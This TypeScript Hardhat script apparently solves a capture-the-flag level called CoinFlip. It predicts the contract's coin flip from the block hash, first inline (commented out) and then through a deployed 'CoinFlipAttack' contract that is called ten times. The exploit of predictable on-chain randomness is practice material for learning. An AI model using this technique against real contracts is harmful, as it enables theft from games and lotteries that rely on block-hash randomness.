import { ethers } from "hardhat";
import fs from "fs";
import path from "path";

async function main() {
  // get contract by address & abi
  const instanceAddress = "0x010Ebe20083714884030173D3D9f2c749EB926C7";

  const abiPath = path.join(__dirname, "..", "abis", "coin_flip.json");
  if (!fs.existsSync(abiPath)) {
    console.error(`ABI file not found at ${abiPath}`);
    process.exit(1);
  }
  const abiJson = JSON.parse(fs.readFileSync(abiPath, "utf8"));

  const [signer] = await ethers.getSigners();
  const provider = ethers.provider;

  const contract = new ethers.Contract(instanceAddress, abiJson, signer);
  console.log("Attached to contract:", contract.target);

  // Try 1 =======================================
  // constant
  // const FACTOR = BigInt(
  //   "57896044618658097711785492504343953926634992332820282019728792003956564819968"
  // );

  // // function call
  // for (let i = 0; i < 10; i++) {
  //   // 1) get blockValue
  //   const blockNumber = await provider.getBlockNumber();
  //   const block = await provider.getBlock(blockNumber);

  //   if (!block || !block.hash) {
  //     await new Promise((res) => setTimeout(res, 1000)); // 1초 대기
  //     i--;
  //     continue;
  //   }

  //   // 2) get coinFlip ()
  //   const coinFlip = BigInt(block.hash) / FACTOR;

  //   // 3) get result
  //   const side = coinFlip == 1n ? true : false;

  //   // 4) send tx
  //   const tx = await contract.flip(side);
  //   await tx.wait();
  //   console.log("Try", i + 1, ": ", tx.hash);
  // }

  // Try 2 =======================================
  const attackContract = await ethers.getContractFactory("CoinFlipAttack");
  const attack = await attackContract.deploy(instanceAddress);
  await attack.waitForDeployment();
  console.log("Attack Contract deployed:", await attack.getAddress());

  for (let i = 0; i < 10; i++) {
    const tx = await attack.attack();
    await tx.wait();
    console.log("Try", i + 1, ": ", tx.hash);
    await new Promise((r) => setTimeout(r, 15000)); // wait for block
    console.log(await contract.consecutiveWins());
  }
}

main().catch((err) => {
  console.error("Error:", err);
  process.exitCode = 1;
});
